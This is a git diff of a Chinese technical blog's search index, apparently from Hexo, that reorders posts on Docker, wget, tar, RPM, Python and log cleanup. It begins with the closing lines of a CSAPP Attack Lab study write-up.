cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image11.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
+<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
+<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
+<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
+]]></content>
+      <categories>
+        <category>CSAPP</category>
+      </categories>
+      <tags>
+        <tag>CSAPP</tag>
       </tags>
   </entry>
   <entry>
@@ -2429,6 +2429,24 @@
       </tags>
   </entry>
   <entry>
+    <title>修改Docker容器的存储路径</title>
+    <url>/2021/1016200721.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>docker拉取的镜像默认存储在根路径(<code>/var/lib/docker</code>)，但根路径存储空间有限。我们可以通过挂载更大的磁盘，将docker数据迁移到挂载磁盘上, 以解决空间不足问题。具体方法如下：</p>
+<span id="more"></span>
+
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>假设挂载磁盘在<code>/usr1</code>，需要将docker数据迁移到路径<code>/usr1</code>下。步骤如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker stop 				# 停止容器</span><br><span class="line">mv /var/lib/docker /usr1/docker 	# 迁移docker数据到新路径，新路径只需保证在/usr1下即可</span><br><span class="line">ln -s /usr1/docker /var/lib/docker  # 创建软连接</span><br><span class="line">service docker start				# 重新启动docker</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>df -h</code>命令可确认修改生效。</p>
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用GDB修改二进制文件</title>
     <url>/2021/1016201159.html</url>
     <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>GDB不仅可以用来调试程序，还可以直接修改被调试程序的二进制文件。这种方式相比于改源码重新编译、<code>gdb attach</code>有什么优势呢？考虑以下企业生产环境中的几个调试场景：</p>
@@ -2479,6 +2497,26 @@
       </tags>
   </entry>
   <entry>
+    <title>使用wget批量下载指定类型文件</title>
+    <url>/2021/1016200952.html</url>
+    <content><![CDATA[<p>举例：下载所有的RPM包(文件的扩展名为rpm)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -c -r -np -k -L -p -A rpm http:XXX/</span><br></pre></td></tr></table></figure>
+
+<p>其中各参数意义可通过<code>wget -h</code>查看，如下：</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -h</span><br><span class="line">...</span><br><span class="line">-c,  --continue                  resume getting a partially-downloaded file</span><br><span class="line">-r,  --recursive                 specify recursive download</span><br><span class="line">-np, --no-parent                 don&#x27;t ascend to the parent directory</span><br><span class="line">-k,  --convert-links             make links in downloaded HTML or CSS point to local files</span><br><span class="line">-L,  --relative                  follow relative links only</span><br><span class="line">-p,  --page-requisites           get all images, etc. needed to display HTML page</span><br><span class="line">-A,  --accept=LIST               comma-separated list of accepted extensions</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>wget</category>
+      </categories>
+      <tags>
+        <tag>wget</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redis抓包分析案例</title>
     <url>/2021/1106201429.html</url>
     <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><strong>业务背景：</strong> 有一台由多个Docker容器组成的仿真设备环境，1个Docker部署Redis服务端，剩余每个Docker都作为Redis客户端，用于模拟一块单板。</p>
@@ -2519,26 +2557,6 @@
       <tags>
         <tag>troubleshooting</tag>
         <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用wget批量下载指定类型文件</title>
-    <url>/2021/1016200952.html</url>
-    <content><![CDATA[<p>举例：下载所有的RPM包(文件的扩展名为rpm)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -c -r -np -k -L -p -A rpm http:XXX/</span><br></pre></td></tr></table></figure>
-
-<p>其中各参数意义可通过<code>wget -h</code>查看，如下：</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -h</span><br><span class="line">...</span><br><span class="line">-c,  --continue                  resume getting a partially-downloaded file</span><br><span class="line">-r,  --recursive                 specify recursive download</span><br><span class="line">-np, --no-parent                 don&#x27;t ascend to the parent directory</span><br><span class="line">-k,  --convert-links             make links in downloaded HTML or CSS point to local files</span><br><span class="line">-L,  --relative                  follow relative links only</span><br><span class="line">-p,  --page-requisites           get all images, etc. needed to display HTML page</span><br><span class="line">-A,  --accept=LIST               comma-separated list of accepted extensions</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>wget</category>
-      </categories>
-      <tags>
-        <tag>wget</tag>
       </tags>
   </entry>
   <entry>
@@ -2770,24 +2788,6 @@
       <tags>
         <tag>troubleshooting</tag>
         <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>修改Docker容器的存储路径</title>
-    <url>/2021/1016200721.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>docker拉取的镜像默认存储在根路径(<code>/var/lib/docker</code>)，但根路径存储空间有限。我们可以通过挂载更大的磁盘，将docker数据迁移到挂载磁盘上, 以解决空间不足问题。具体方法如下：</p>
-<span id="more"></span>
-
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>假设挂载磁盘在<code>/usr1</code>，需要将docker数据迁移到路径<code>/usr1</code>下。步骤如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker stop 				# 停止容器</span><br><span class="line">mv /var/lib/docker /usr1/docker 	# 迁移docker数据到新路径，新路径只需保证在/usr1下即可</span><br><span class="line">ln -s /usr1/docker /var/lib/docker  # 创建软连接</span><br><span class="line">service docker start				# 重新启动docker</span><br></pre></td></tr></table></figure>
-
-<p>通过 <code>df -h</code>命令可确认修改生效。</p>
-]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
       </tags>
   </entry>
   <entry>
@@ -3991,27 +3991,6 @@
       </tags>
   </entry>
   <entry>
-    <title>tar打包时去掉目录前缀的方法</title>
-    <url>/2022/0604205633.html</url>
-    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>tar命令打包时，默认会带上文件路径，举例如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── dir1</span><br><span class="line">│   └── file1.txt</span><br><span class="line">└── dir2</span><br><span class="line">    ├── dir3</span><br><span class="line">    │   └── file3.txt</span><br><span class="line">    └── file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar zcf hello.tar.gz ./*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:20 ./dir1/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir1/file1.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir2/file2.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/dir3/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 ./dir2/dir3/file3.txt</span><br></pre></td></tr></table></figure>
-<h2 id="如果我打包时不想带上文件路径，怎么操作？"><a href="#如果我打包时不想带上文件路径，怎么操作？" class="headerlink" title="如果我打包时不想带上文件路径，怎么操作？"></a>如果我打包时不想带上文件路径，怎么操作？</h2><span id="more"></span>
-
-<p>利用-C参数，方法如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar -zcf hello.tar.gz -C dir1/ file1.txt -C ../dir2/ file2.txt -C dir3/ file3.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file1.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file2.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 file3.txt</span><br></pre></td></tr></table></figure>
-
-<p>tar用法参考手册：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar --help</span><br><span class="line">Local file selection:</span><br><span class="line">-C, --directory=DIR        change to directory DIR</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>tar</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Redis发布与订阅源码分析</title>
     <url>/2022/0129204852.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过阅读Redis源码，配合GDB和抓包等调试手段，分析Redis发布订阅的实现原理，思考相关问题。</p>
@@ -4267,6 +4246,27 @@
       </tags>
   </entry>
   <entry>
+    <title>tar打包时去掉目录前缀的方法</title>
+    <url>/2022/0604205633.html</url>
+    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>tar命令打包时，默认会带上文件路径，举例如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── dir1</span><br><span class="line">│   └── file1.txt</span><br><span class="line">└── dir2</span><br><span class="line">    ├── dir3</span><br><span class="line">    │   └── file3.txt</span><br><span class="line">    └── file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar zcf hello.tar.gz ./*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:20 ./dir1/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir1/file1.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir2/file2.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/dir3/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 ./dir2/dir3/file3.txt</span><br></pre></td></tr></table></figure>
+<h2 id="如果我打包时不想带上文件路径，怎么操作？"><a href="#如果我打包时不想带上文件路径，怎么操作？" class="headerlink" title="如果我打包时不想带上文件路径，怎么操作？"></a>如果我打包时不想带上文件路径，怎么操作？</h2><span id="more"></span>
+
+<p>利用-C参数，方法如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar -zcf hello.tar.gz -C dir1/ file1.txt -C ../dir2/ file2.txt -C dir3/ file3.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file1.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file2.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 file3.txt</span><br></pre></td></tr></table></figure>
+
+<p>tar用法参考手册：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar --help</span><br><span class="line">Local file selection:</span><br><span class="line">-C, --directory=DIR        change to directory DIR</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>tar</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>k8s删除namespace失败, 陷入Terminating状态解决方法</title>
     <url>/2022/1116205828.html</url>
     <content><![CDATA[<h2 id="先尝试强制删除deployment和pod等资源"><a href="#先尝试强制删除deployment和pod等资源" class="headerlink" title="先尝试强制删除deployment和pod等资源"></a>先尝试强制删除deployment和pod等资源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n $&#123;ns&#125; delete deployment --all --force</span><br><span class="line">kubectl -n $&#123;ns&#125; delete pod --all --force</span><br></pre></td></tr></table></figure>
@@ -4352,21 +4352,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
-    <url>/2023/0301211739.html</url>
-    <content><![CDATA[<p>Add following line to spec file</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
-<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
-]]></content>
-      <categories>
-        <category>RPM</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>RPM</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VMware Esxi Access to resource settings on the host is restricted to the server...解决方法</title>
     <url>/2023/0213210542.html</url>
     <content><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
@@ -4381,6 +4366,21 @@
       </categories>
       <tags>
         <tag>VMware</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
+    <url>/2023/0301211739.html</url>
+    <content><![CDATA[<p>Add following line to spec file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
+]]></content>
+      <categories>
+        <category>RPM</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>RPM</tag>
       </tags>
   </entry>
   <entry>
@@ -4640,19 +4640,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RPM中的config和config(noreplace)</title>
-    <url>/2023/0509213628.html</url>
-    <content><![CDATA[<p>参考：<a href="https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html">https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>RPM</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LeetCode 常用数据结构和算法(C++)</title>
     <url>/2023/0509214116.html</url>
     <content><![CDATA[<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; list;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs )</span></span>;				<span class="comment">// 全部移动</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs, iterator ix )</span></span>;	<span class="comment">// 移一个</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs, iterator first, iterator last )</span></span>;	<span class="comment">// 移一组</span></span><br></pre></td></tr></table></figure>
@@ -4679,6 +4666,19 @@
       </categories>
       <tags>
         <tag>LeetCode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RPM中的config和config(noreplace)</title>
+    <url>/2023/0509213628.html</url>
+    <content><![CDATA[<p>参考：<a href="https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html">https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>RPM</tag>
       </tags>
   </entry>
   <entry>
@@ -4982,46 +4982,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python的Lamdba函数是什么，应用场景是什么?</title>
-    <url>/2023/0815215310.html</url>
-    <content><![CDATA[<p><strong>定义：</strong> Lambda函数也叫匿名函数，它是功能简单，只用一行代码就能实现的小型函数。<br><strong>使用场景：</strong> Lambda函数没有名字，不用考虑函数名冲突问题；减少了代码行数，方便又简洁。<br><strong>格式：</strong> lambda 参数[,参数] : 表达式 （例： <code>lambda x,y : x + y</code>）<br><strong>举例：</strong> 用lambda函数求出1到20中所有的奇数并组成一个list：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">1</span>, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(L)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-
-<p>另外，匿名函数也可以赋值给变量，可以通过该变量调用这个匿名函数：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">5</span>))</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python解压序列，可迭代对象赋值给多个变量方法</title>
-    <url>/2023/0822215515.html</url>
-    <content><![CDATA[<h2 id="解压序列赋值给多个变量"><a href="#解压序列赋值给多个变量" class="headerlink" title="解压序列赋值给多个变量"></a>解压序列赋值给多个变量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>year, month, day = [<span class="number">2002</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(year, month, day)</span><br><span class="line"><span class="number">2002</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
-
-<p>可以用占位符，丢弃其他的值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [<span class="number">2002</span>,<span class="number">6</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(year)</span><br><span class="line"><span class="number">2002</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="解压可迭代对象赋值给多个变量"><a href="#解压可迭代对象赋值给多个变量" class="headerlink" title="解压可迭代对象赋值给多个变量"></a>解压可迭代对象赋值给多个变量</h2><span id="more"></span>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p01_unpack_sequence_into_separate_variables.html">Python Cookbook 第一章</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Effective Python 笔记</title>
     <url>/2023/0812215151.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不错的Python进阶书。写这个笔记的目的是，把书中提到的编写高质量Python的59个方法的要点记录下来，便于今后的工作中查阅</p>
@@ -5282,6 +5242,46 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 <h2 id="53-用虚拟环境隔离项目，并重建其依赖关系"><a href="#53-用虚拟环境隔离项目，并重建其依赖关系" class="headerlink" title="53. 用虚拟环境隔离项目，并重建其依赖关系"></a>53. 用虚拟环境隔离项目，并重建其依赖关系</h2><h1 id="x20-第8章-部署"><a href="#x20-第8章-部署" class="headerlink" title="&#x20;第8章 部署"></a>&#x20;第8章 部署</h1><h2 id="54-考虑用模块级别代码配置不同部署环境-x20"><a href="#54-考虑用模块级别代码配置不同部署环境-x20" class="headerlink" title="54. 考虑用模块级别代码配置不同部署环境&#x20;"></a>54. 考虑用模块级别代码配置不同部署环境&#x20;</h2><h2 id="55-通过repr字符串输出调试信息"><a href="#55-通过repr字符串输出调试信息" class="headerlink" title="55. 通过repr字符串输出调试信息"></a>55. 通过repr字符串输出调试信息</h2><p>简单的print不能打印出值的类型信息，可以用repr获取类型信息</p>
 <h2 id="56-用unittest测试全部代码"><a href="#56-用unittest测试全部代码" class="headerlink" title="56. 用unittest测试全部代码"></a>56. 用unittest测试全部代码</h2><h2 id="57-用pdb实现交互调试"><a href="#57-用pdb实现交互调试" class="headerlink" title="57. 用pdb实现交互调试"></a>57. 用pdb实现交互调试</h2><p><a href="https://docs.python.org/zh-cn/3/library/pdb.html">https://docs.python.org/zh-cn/3/library/pdb.html</a></p>
 <h2 id="58-先分析性能，然后再优化"><a href="#58-先分析性能，然后再优化" class="headerlink" title="58. 先分析性能，然后再优化"></a>58. 先分析性能，然后再优化</h2><h2 id="59-用tracemalloc掌握内存使用和泄漏情况"><a href="#59-用tracemalloc掌握内存使用和泄漏情况" class="headerlink" title="59. 用tracemalloc掌握内存使用和泄漏情况"></a>59. 用tracemalloc掌握内存使用和泄漏情况</h2>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python的Lamdba函数是什么，应用场景是什么?</title>
+    <url>/2023/0815215310.html</url>
+    <content><![CDATA[<p><strong>定义：</strong> Lambda函数也叫匿名函数，它是功能简单，只用一行代码就能实现的小型函数。<br><strong>使用场景：</strong> Lambda函数没有名字，不用考虑函数名冲突问题；减少了代码行数，方便又简洁。<br><strong>格式：</strong> lambda 参数[,参数] : 表达式 （例： <code>lambda x,y : x + y</code>）<br><strong>举例：</strong> 用lambda函数求出1到20中所有的奇数并组成一个list：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">1</span>, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(L)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>另外，匿名函数也可以赋值给变量，可以通过该变量调用这个匿名函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">5</span>))</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python解压序列，可迭代对象赋值给多个变量方法</title>
+    <url>/2023/0822215515.html</url>
+    <content><![CDATA[<h2 id="解压序列赋值给多个变量"><a href="#解压序列赋值给多个变量" class="headerlink" title="解压序列赋值给多个变量"></a>解压序列赋值给多个变量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>year, month, day = [<span class="number">2002</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(year, month, day)</span><br><span class="line"><span class="number">2002</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>可以用占位符，丢弃其他的值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [<span class="number">2002</span>,<span class="number">6</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(year)</span><br><span class="line"><span class="number">2002</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="解压可迭代对象赋值给多个变量"><a href="#解压可迭代对象赋值给多个变量" class="headerlink" title="解压可迭代对象赋值给多个变量"></a>解压可迭代对象赋值给多个变量</h2><span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p01_unpack_sequence_into_separate_variables.html">Python Cookbook 第一章</a></p>
+]]></content>
       <categories>
         <category>Python</category>
       </categories>
@@ -7364,36 +7364,6 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
-    <title>Linux中定时删除10天前的日志文件</title>
-    <url>/2024/1009194730.html</url>
-    <content><![CDATA[<p>例如：删除&#x2F;data&#x2F;log&#x2F;目录下所有10天前的.log文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /data/log/ -type f -name &quot;*.log&quot; -mtime +10 -exec rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>
-
-<p>只查看要删除的文件有哪些，不真正删除文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logfiles=$(find /data/log/ -type f -name &quot;*.log&quot; -mtime +10)</span><br><span class="line">echo $logfiles</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-
-<p>使用crontab添加一个定时任务，每天0点执行一次删除任务</p>
-<p>先写个脚本<code>delete_old_logfile.sh</code>删除10天前日志</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/sbin/:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">logfiles=$(find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;logfiles&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10 -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Delete old logfiles: <span class="variable">$&#123;logfiles&#125;</span>, ret: $?&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<p>再配置crontab</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;0 0 * * * (cd /path/to; delete_old_logfile.sh)&#x27; &gt;&gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure>
-
-<h2 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h2><p>在&#x2F;data&#x2F;log目录下手动创建几个.log文件，用touch命令把文件的mtime改到10天前</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch -m -d &quot;1999-01-01 00:00:00&quot; /data/log/*.log</span><br></pre></td></tr></table></figure>
-<p>手动修改系统时间到23:59:50, 观察0点钟crontab定时任务是否执行</p>
